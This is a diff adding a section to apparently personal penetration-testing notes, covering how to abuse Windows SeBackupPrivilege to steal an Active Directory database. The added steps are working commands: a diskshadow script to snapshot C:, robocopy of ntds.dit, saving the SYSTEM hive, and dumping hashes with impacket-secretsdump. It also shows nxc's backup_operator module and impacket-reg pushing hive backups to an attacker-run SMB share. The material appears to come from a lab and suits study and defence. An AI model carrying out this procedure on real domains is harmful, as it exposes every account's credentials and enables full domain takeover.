@@ -454,6 +454,70 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Import-Module .\SeBackupPrivilegeUtils.dll
 ```
 
-- 
+- ntds.dit is the Active Directory database file located at C:\Windows\NTDS\ntds.dit. Even with SeBackupPrivilege, the file cannot be directly copied while the NTDS service is running because it is exclusively locked by the Extensible Storage Engine. The solution is to use the Volume Shadow Copy Service (VSS) to create a point-in-time snapshot of the C: volume, then read ntds.dit from the snapshot.
+- DiskShadow.exe is a Microsoft-signed tool built into Windows Server that automates VSS operations using a script file. Create with kali
+
+```bash
+bash -c "echo -ne 'set context persistent nowriters\nadd volume c: alias raj\ncreate expose %raj% z:' > backup.dsh;unix2dos backup.dsh"
+```
+- Create a directory in `C:\`-:
+
+<img width="984" height="462" alt="image" src="https://github.com/user-attachments/assets/239e03ec-151a-4c93-aa0f-9a4fdca8fc8d" />
+
+- Then, run which  creates a shadow copy is now accessible at Z:\. This is an exact read-only clone of C: at the moment of snapshot creation, bypassing all file locks held by running services.-:
+
+```pwsh
+#disk shadow to create a shadow copy
+diskshadow /s backup.dsh
+```
+
+<img width="1162" height="715" alt="image" src="https://github.com/user-attachments/assets/85a88a22-c873-4ee1-a6f3-5154514306fd" />
+
+- Then, robocopy to finish it save it-:
+
+```powershell
+robocopy /b z:\windows\ntds . ntds.dit
+```
+
+<img width="955" height="359" alt="image" src="https://github.com/user-attachments/assets/62d01297-7eaf-4668-9e53-886251136120" />
+
+- Lastly, you need to save the PEK, The ntds.dit is encrypted with the PEK (Password Encryption Key), which itself is protected by the boot key (SysKey) stored in the SYSTEM registry hive. Without this hive, the hashes cannot be decrypted. Save it to disk:
+
+```powershell
+reg save hklm\system c:\Temp\system
+```
+
+- Dumping with `impacket-secretsdump`-:
+
+```bash
+impacket-secretsdump -ntds ntds.dit -system system LOCAL
+```
+
+<img width="1048" height="479" alt="image" src="https://github.com/user-attachments/assets/9a57c3b8-d6df-4c5e-8086-c2f2dfee273c" />
+
+
+- Or use nxc's `backup_operator`-:
+
+```bash
+nxc smb 192.168.232.129  -d cs.org -u "stephanie.clara"  -p 'ncc1701' -M backup_operator
+```
+
+<img width="1858" height="516" alt="image" src="https://github.com/user-attachments/assets/ab92e403-dad4-439f-be95-f1a91ad8f26e" />
+
+- Or `impacket-reg`
+- Set up an smbshare
+
+```
+impacket-smbserver share $(pwd) -smb2support
+```
+<img width="734" height="182" alt="image" src="https://github.com/user-attachments/assets/ac17e312-1d5d-4391-9613-ef3b1a89bfc6" />
+
+- Exploiting it-:
+
+```bash
+impacket-reg "cs.org"/"stephanie.clara":"password"@"192.168.232.129" backup -o '\\192.168.232.130\share'
+```
+
+<img width="1079" height="309" alt="image" src="https://github.com/user-attachments/assets/eaa4ce58-b71d-403c-bf5d-93d8f6d174f0" />
 
 -----------------
